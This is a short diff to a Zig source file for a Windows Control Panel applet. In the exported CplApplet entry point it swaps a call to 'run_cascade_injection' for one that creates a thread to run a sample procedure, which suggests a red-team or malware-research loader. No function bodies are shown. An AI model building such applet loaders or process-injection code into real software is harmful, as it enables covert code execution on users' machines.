@@ -20,8 +20,8 @@ pub export fn CplApplet(hwndCpl: ?windows.HWND, msg: windows.UINT, lParam1: wind
     _ = msg;
     _ = lParam1;
     _ = lParam2;
-    //createThreadAndExecute(sampleProcedure);
-    run_cascade_injection();
+    createThreadAndExecute(sampleProcedure);
+    //run_cascade_injection();
    // _ = user32.MessageBoxA(null, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
 
     return 1;
